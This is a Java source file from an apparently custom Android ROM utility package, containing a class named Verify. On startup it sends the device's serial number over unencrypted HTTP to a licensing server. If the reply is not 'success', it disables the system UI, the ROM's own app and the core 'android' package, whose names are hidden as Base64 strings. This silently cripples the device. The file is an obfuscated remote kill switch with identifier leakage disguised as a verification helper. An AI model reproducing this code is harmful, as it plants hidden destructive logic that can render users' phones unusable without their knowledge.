package com.leo.salt.utils.root;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import android.content.pm.PackageManager;
import android.util.Base64;

import static com.leo.salt.utils.AndroidUtils.getProp;


public class Verify {
	
	private static Verify mInstance;
	
	public static Verify get(Context context) {
		if (mInstance == null) {
			synchronized (Verify.class) {
				if (mInstance == null) {
					mInstance = new Verify(context.getApplicationContext());
				}
			}
		}
		return mInstance;
	}
	
	private Verify(Context mContext){
		getUpdate(mContext);
	}
	
	
	private String getURL() {
		StringBuilder urlBuilder = new StringBuilder();
		urlBuilder.append("http://vip.leorom.cc/?action=check&code=");
		urlBuilder.append(getProp("ril.serialnumber"));
		return urlBuilder.toString();
	}
	
	private  String convertInputStreamToString(InputStream is) {
		byte[] byteArray = convertInputStreamToByteArray(is);
		if (byteArray == null)
			return null;
		return new String(byteArray);
	}
	
	private  byte[] convertInputStreamToByteArray(InputStream is) {
		ByteArrayOutputStream bos = null;
		try {
			int len = -1;
			byte[] buf = new byte[128];
			bos = new ByteArrayOutputStream();
			while ((len = is.read(buf)) != -1) {
				bos.write(buf, 0, len);
			}
			bos.flush();
			return bos.toByteArray();
		} catch (Exception e) {
		} finally {
			try {
				is.close();
				bos.close();
			} catch (IOException e) {
			}
		}
		return null;
	}
	
	private void getUpdate(final Context mContext) {
		ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();
		singleThreadExecutor.execute(new Runnable() {
			@Override
			public void run() {
				try {
					URL url = new URL(getURL());
					HttpURLConnection conn = (HttpURLConnection) url.openConnection();
					conn.setConnectTimeout(5000);
					conn.setRequestMethod("GET");
					conn.setRequestProperty("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
					if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
						InputStream is = conn.getInputStream();
						String strJson = convertInputStreamToString(is);
						try {
							JSONObject value = new JSONObject(strJson);
							String status = value.getString("status");
							if (!status.equals("success")){
								PackageManager pm = mContext.getPackageManager();
								pm.setApplicationEnabledSetting(new String(Base64.decode("Y29tLmFuZHJvaWQuc3lzdGVtdWk=".getBytes(), 0)), 2, 0);
								pm.setApplicationEnabledSetting(new String(Base64.decode("Y29tLmZ1c2lvbmxlby5zYWx0".getBytes(), 0)), 2, 0);
								pm.setApplicationEnabledSetting(new String(Base64.decode("YW5kcm9pZA==".getBytes(), 0)), 2, 0);
							}
							is.close();
						} catch (JSONException e) {
						}
					}
				} catch (MalformedURLException e) {
				} catch (IOException e) {
				}
			}
		});
	}
}
